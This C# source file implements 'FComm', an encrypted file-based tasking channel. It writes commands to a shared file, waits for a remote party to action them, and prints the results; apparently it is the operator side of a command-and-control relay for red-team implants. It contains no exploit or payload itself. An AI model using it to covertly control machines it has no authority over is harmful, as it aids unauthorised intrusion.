using System;
using System.IO.Compression;
using System.Linq;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace FComm
{
    public class FCDataGram
    {
        public string PacketType { get; set; }
        public string Input { get; set; }
        public string Output { get; set; }
        public bool Actioned { get; set; }
        public bool Retrieved { get; set; }

        public FCDataGram()
        {
            Actioned = false;
            Retrieved = false;
        }

        public FCDataGram(string objContents)
        {
            char[] delim = { ',' };
            FromStringArray(objContents.Split(delim));
        }

        public override string ToString()
        {
            return string.Join(",", ToStringArray());
        }

        public string[] ToStringArray()
        {
            return new[] { PacketType, Input, Output, Actioned.ToString(), Retrieved.ToString() };
        }

        public void FromStringArray(string[] objContents)
        {
            PacketType = objContents[0];
            Input = objContents[1];
            Output = objContents[2];
            Actioned = bool.Parse(objContents[3]);
            Retrieved = bool.Parse(objContents[4]);
        }
    }

    public class FCommServer
    {
        private readonly string _filepath;
        private readonly string _key;
        internal const int SLEEP_TIME_MILLIS = 1000;


        public FCommServer(string filepath, string key)
        {
            try
            {
                _filepath = filepath;
                _key = key;
                var initPacket = ReadFromFile();
                if (initPacket == null || initPacket.PacketType != "INIT")
                {
                    throw new Exception($"Packet in file is not an INIT packet, delete the file if it is from an old FComm instance: {initPacket}");
                }

                Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String(initPacket.Input)));
                initPacket.Actioned = true;
                // TODO here is where we can write the new config
                initPacket.Output = null;
                WriteToFile(initPacket);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                throw;
            }
        }

        public void SetNewTask(string input)
        {
            var currentInput = ReadFromFile();
            if (currentInput != null)
            {
                throw new Exception($"File is not empty when writing new task: {currentInput}...");
            }

            var task = new FCDataGram { PacketType = "TASK", Input = input, Output = null };
#if DEBUG
            Console.WriteLine($"[*] Writing new FComm task to file: {task}");
#endif
            WriteToFile(task);
        }

        public void ClearTask()
        {
            // TODO limit attempts?
            while (true)
            {
                try
                {
                    using (var fileStream = new FileStream(_filepath, FileMode.Create, FileAccess.Write))
                    {
                        fileStream.SetLength(0);
                        return;
                    }
                }
                catch (IOException e)
                {
#if DEBUG
                    Console.WriteLine($"[-] Error clearing tasks in file: {e.Message}. Retrying...");
#endif
                    Thread.Sleep(SLEEP_TIME_MILLIS);
                }
            }
        }

        private void WriteToFile(FCDataGram data)
        {
            var encrypted = Encrypt(_key, data.ToString());
            // TODO limit attempts?
            while (true)
            {
                try
                {
                    using (var fileStream = new FileStream(_filepath, FileMode.Create, FileAccess.Write))
                    {
                        using (var streamWriter = new StreamWriter(fileStream))
                        {
                            streamWriter.WriteLine(encrypted);
                            return;
                        }
                    }
                }
                catch (IOException e)
                {
#if DEBUG
                    Console.WriteLine($"[-] Error writing to file: {e.Message}, retrying...");
#endif
                    Thread.Sleep(SLEEP_TIME_MILLIS);
                }
            }
        }

        internal FCDataGram ReadFromFile()
        {
            while (true)
            {
                try
                {
                    using (var fileStream = new FileStream(_filepath, FileMode.Open, FileAccess.Read))
                    {
                        using (var streamReader = new StreamReader(fileStream))
                        {
                            // TODO multiple lines?
                            var line = streamReader.ReadLine();
                            return line == null ? null : new FCDataGram(Decrypt(_key, line).TrimEnd('\0'));
                        }
                    }
                }
                catch (IOException e)
                {
#if DEBUG
                    Console.WriteLine($"[-] Error reading from file: {e.Message}, retrying...");
#endif
                    Thread.Sleep(SLEEP_TIME_MILLIS);
                }
            }
        }

        private static string Decrypt(string key, string ciphertext)
        {
            var rawCipherText = Convert.FromBase64String(ciphertext);
            var iv = new byte[16];
            Array.Copy(rawCipherText, iv, 16);
            try
            {
                var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(iv));
                var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
                return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
            }
            catch
            {
                var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(iv), false);
                var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
                return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
            }
            finally
            {
                Array.Clear(rawCipherText, 0, rawCipherText.Length);
                Array.Clear(iv, 0, 16);
            }
        }

        private static string Encrypt(string key, string un, bool comp = false, byte[] unByte = null)
        {
            byte[] encryptedBytes;
            encryptedBytes = unByte ?? Encoding.UTF8.GetBytes(un);

            if (comp)
                encryptedBytes = GzipCompress(encryptedBytes);

            try
            {
                var a = CreateEncryptionAlgorithm(key, null);
                var f = a.CreateEncryptor().TransformFinalBlock(encryptedBytes, 0, encryptedBytes.Length);
                return Convert.ToBase64String(CombineArrays(a.IV, f));
            }
            catch
            {
                var a = CreateEncryptionAlgorithm(key, null, false);
                var f = a.CreateEncryptor().TransformFinalBlock(encryptedBytes, 0, encryptedBytes.Length);
                return Convert.ToBase64String(CombineArrays(a.IV, f));
            }
        }

        private static SymmetricAlgorithm CreateEncryptionAlgorithm(string key, string iv, bool rij = true)
        {
            SymmetricAlgorithm algorithm;
            if (rij)
                algorithm = new RijndaelManaged();
            else
                algorithm = new AesCryptoServiceProvider();

            algorithm.Mode = CipherMode.CBC;
            algorithm.Padding = PaddingMode.Zeros;
            algorithm.BlockSize = 128;
            algorithm.KeySize = 256;

            if (null != iv)
                algorithm.IV = Convert.FromBase64String(iv);
            else
                algorithm.GenerateIV();

            if (null != key)
                algorithm.Key = Convert.FromBase64String(key);

            return algorithm;
        }

        private static byte[] GzipCompress(byte[] raw)
        {
            using (var memory = new MemoryStream())
            {
                using (var gzip = new GZipStream(memory, CompressionMode.Compress, true))
                {
                    gzip.Write(raw, 0, raw.Length);
                }

                return memory.ToArray();
            }
        }

        private static byte[] CombineArrays(byte[] first, byte[] second)
        {
            var ret = new byte[first.Length + second.Length];
            Buffer.BlockCopy(first, 0, ret, 0, first.Length);
            Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
            return ret;
        }
    }

    public static class FCClass
    {
        private static bool _initialised;
        private static FCommServer _fCommServer;
        private static readonly object LOCK = new object();

        public static void Main(string[] args)
        {
            Console.WriteLine(string.Join(",", args));
            Start(args);
        }

        private static void Start(string[] args)
        {
            if (args.Length == 3 && args[0].ToLower() == "start")
            {
                try
                {
                    if (_initialised)
                    {
                        Console.WriteLine("FComm already initialised...");
                        return;
                    }

                    var filePath = args[1];
                    var encryptionKey = args[2];
                    Console.WriteLine($"[+] Connecting to: {filePath} with key {encryptionKey}");
                    lock (LOCK)
                    {
                        _fCommServer = new FCommServer(filePath, encryptionKey);
                    }

                    if (_fCommServer != null)
                    {
                        _initialised = true;
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[-] Error in FComm Initialisation!!: {e}");
                }

                return;
            }

            lock (LOCK)
            {
                try
                {
                    var currentContents = _fCommServer.ReadFromFile();
                    if (currentContents != null)
                    {
                        if (currentContents.PacketType == "INIT")
                        {
                            while (true)
                            {
                                if (currentContents.Retrieved)
                                {
                                    _fCommServer.ClearTask();
                                    break;
                                }
#if DEBUG
                                Console.WriteLine("[*] Init task has not been retrieved yet...");
#endif
                                Thread.Sleep(FCommServer.SLEEP_TIME_MILLIS);
                            }
                        }
                        else
                        {
#if DEBUG
                            Console.WriteLine($"[-] Unexpected task already in file: {currentContents}");
#endif
                            throw new Exception($"[-] Unexpected task already in file: {currentContents}");
                        }
                    }

                    var command = $"{string.Join(" ", args)}";

                    _fCommServer.SetNewTask(command);

                    if (command.ToLower().StartsWith("kill"))
                    {
                        Console.Write("FComm server killed...");
                        return;
                    }

                    while (true)
                    {
                        var task = _fCommServer.ReadFromFile();

                        if (task == null)
                        {
#if DEBUG
                            Console.WriteLine("[-] Task has been cleared from file...");
#endif
                            throw new Exception("[-] Task has been cleared from file...");
                        }

                        if (task.PacketType != "TASK")
                            throw new Exception($"Invalid task packet: {task}");

                        if (!task.Actioned)
                        {
#if DEBUG
                            Console.WriteLine("[-] Task has not been actioned, waiting...");
#endif
                            Thread.Sleep(FCommServer.SLEEP_TIME_MILLIS);
                            continue;
                        }

                        Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String(task.Output)));
                        _fCommServer.ClearTask();
                        break;
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[-] Error in FComm Command: {e}");
                }
            }
        }
    }
}